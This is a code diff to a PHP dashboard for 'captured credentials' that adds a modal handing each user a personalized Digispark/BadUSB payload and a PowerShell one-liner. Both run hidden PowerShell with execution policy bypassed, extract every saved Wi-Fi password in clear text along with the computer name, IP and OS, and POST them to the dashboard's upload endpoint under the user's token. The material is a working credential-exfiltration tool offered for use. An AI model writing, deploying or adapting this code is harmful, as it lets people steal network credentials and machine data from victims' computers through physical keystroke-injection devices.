@@ -986,7 +986,88 @@ $uniqueSSIDs   = count(array_unique(array_column($deduped, 'ssid')));
       <h1>Network Captures Dashboard</h1>
       <p><?php echo $isAdmin ? 'Admin View: Overview of all network testing entries.' : 'Showing your private captured credentials.'; ?></p>
     </div>
+    <div>
+      <button type="button" onclick="openPayloadModal()" style="display:inline-flex;align-items:center;gap:8px;padding:11px 18px;border-radius:10px;border:none;background:linear-gradient(135deg,#6366f1,#4f46e5);color:#fff;font-family:inherit;font-size:13px;font-weight:600;cursor:pointer;box-shadow:0 4px 15px rgba(99,102,241,0.35);">
+        ⚡ Digispark / BadUSB Payload
+      </button>
+    </div>
   </div>
+
+  <!-- Digispark Payload Modal -->
+  <div id="payloadModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);z-index:200;align-items:center;justify-content:center;">
+    <div style="background:#0f172a;border:1px solid rgba(255,255,255,0.1);border-radius:18px;padding:28px;width:100%;max-width:680px;max-height:90vh;overflow-y:auto;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+        <h2 style="font-size:18px;color:#fff;">⚡ Your Personalized Digispark Payload</h2>
+        <button type="button" onclick="closePayloadModal()" style="background:none;border:none;color:#94a3b8;font-size:20px;cursor:pointer;">&times;</button>
+      </div>
+      <p style="font-size:13px;color:#94a3b8;margin-bottom:18px;">
+        This payload automatically binds your account token (<strong style="color:#38bdf8;"><?php echo h($currentUser); ?></strong>) so captures route <span style="color:#10b981;font-weight:600;">only to your dashboard</span>!
+      </p>
+
+      <div style="margin-bottom:18px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">1. Digispark (Arduino IDE C++ Code)</span>
+          <button type="button" onclick="copyCode('digiCode')" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#38bdf8;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">📋 Copy Arduino Code</button>
+        </div>
+        <pre id="digiCode" style="font-family:'JetBrains Mono',monospace;font-size:12px;background:#020617;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:14px;color:#cbd5e1;overflow-x:auto;white-space:pre-wrap;">#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(1000);
+
+  // Win + R (Run Dialog)
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+
+  // Exfiltration command with your account token
+  DigiKeyboard.print("powershell -w hidden -ep bypass -nop -c \"");
+  DigiKeyboard.print("$t='<?php echo h($currentUser); ?>';");
+  DigiKeyboard.print("$u='http://<?php echo $_SERVER['HTTP_HOST']; ?>/upload.php?token='+$t;");
+  DigiKeyboard.print("$p=(netsh wlan show profiles)|Select-String ':(.+)$'|%{ $_.Matches.Groups[1].Value.Trim() };");
+  DigiKeyboard.print("foreach($s in $p){");
+  DigiKeyboard.print("$k=(netsh wlan show profile name=$s key=clear|Select-String 'Key Content\\\\s*:\\\\s*(.+)$').Matches.Groups[1].Value;");
+  DigiKeyboard.print("if(-not $k){$k='(Not Found)'};");
+  DigiKeyboard.print("$d=\\\"$(Get-Date -f 'yyyy-MM-dd HH:mm:ss'),$env:COMPUTERNAME,$s,$k,$((Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]),$((Get-CimInstance Win32_OperatingSystem).Caption)\\\";");
+  DigiKeyboard.print("Invoke-RestMethod -Uri $u -Method POST -Body $d;");
+  DigiKeyboard.print("}\"");
+
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  for(;;) { DigiKeyboard.delay(5000); }
+}</pre>
+      </div>
+
+      <div style="margin-bottom:18px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+          <span style="font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;">2. Instant PowerShell One-Liner (Manual Lab Test)</span>
+          <button type="button" onclick="copyCode('psOneLiner')" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#38bdf8;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">📋 Copy PowerShell</button>
+        </div>
+        <pre id="psOneLiner" style="font-family:'JetBrains Mono',monospace;font-size:12px;background:#020617;border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:12px;color:#38bdf8;overflow-x:auto;white-space:pre-wrap;">powershell -w hidden -ep bypass -nop -c "$t='<?php echo h($currentUser); ?>';$u='http://<?php echo $_SERVER['HTTP_HOST']; ?>/upload.php?token='+$t;(netsh wlan show profiles)|Select-String ':(.+)$'|%{ $_.Matches.Groups[1].Value.Trim() }|%{ $s=$_; $k=((netsh wlan show profile name=$s key=clear)|Select-String 'Key Content\s*:\s*(.+)$').Matches.Groups[1].Value; if(-not $k){$k='(Not Found)'}; Invoke-RestMethod -Uri $u -Method POST -Body \"$(Get-Date -f 'yyyy-MM-dd HH:mm:ss'),$env:COMPUTERNAME,$s,$k,$((Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]),$((Get-CimInstance Win32_OperatingSystem).Caption)\" }"</pre>
+      </div>
+
+      <div style="display:flex;justify-content:flex-end;">
+        <button type="button" onclick="closePayloadModal()" style="padding:10px 18px;border-radius:8px;border:none;background:rgba(255,255,255,0.08);color:#fff;font-family:inherit;font-size:13px;font-weight:600;cursor:pointer;">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  function openPayloadModal() {
+    document.getElementById('payloadModal').style.display = 'flex';
+  }
+  function closePayloadModal() {
+    document.getElementById('payloadModal').style.display = 'none';
+  }
+  function copyCode(id) {
+    const text = document.getElementById(id).innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      alert('Copied to clipboard!');
+    });
+  }
+  </script>
 
   <div class="stats-row">
     <div class="card-stat stat-indigo">
